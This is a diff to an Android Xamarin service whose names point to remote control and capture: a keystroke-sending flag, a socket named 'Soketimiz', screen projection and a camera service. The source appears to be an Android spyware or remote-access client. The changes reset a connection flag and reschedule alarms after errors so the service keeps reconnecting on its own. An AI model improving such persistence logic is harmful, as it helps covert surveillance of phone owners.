@@ -44,6 +44,7 @@ namespace Task2
             Platform.Init(Application);
             _globalService = this;
             key_gonder = false;
+            mySocketConnected = false;
             CLOSE_CONNECTION = false;
             mProjectionManager = (MediaProjectionManager)GetSystemService(MediaProjectionService);
             CamInService();
@@ -268,6 +269,7 @@ namespace Task2
                             try { Soketimiz.Close(); } catch (Exception) { }
                             try { Soketimiz.Dispose(); } catch (Exception) { }
                         }
+                        mySocketConnected = false;
                         setAlarm(this);
                     }
                 }
@@ -350,7 +352,7 @@ namespace Task2
                     try { memos.Flush(); memos.Close(); memos.Dispose(); } catch (Exception) { }
                     if (tmp != null) { tmp.Close(); tmp.Dispose(); }
                     mySocketConnected = false;
-                    ((ForegroundService)tmp_form).setAlarm(tmp_form);
+                    ((ForegroundService)tmp_form).setAlarm(_globalService);
                     Dispose();
                 }
             }
@@ -553,7 +555,12 @@ namespace Task2
                 else
                     am.Set(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
             }
-            catch (Exception) { }
+            catch (Exception) 
+            {
+                Task.Delay(50).Wait();
+                mySocketConnected = false;
+                setAlarm(this);
+            }
         }
 
         public void cancelAlarm(Context context)
@@ -2568,7 +2575,7 @@ namespace Task2
         {
             try
             {
-                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
+                Android.Net.Uri uri = Android.Net.Uri.FromFile(new Java.IO.File(filePath));//Android.Net.Uri.Parse("file://" + filePath);
                 player.Reset();
                 player.SetDataSource(this, uri);
                 player.Prepare();
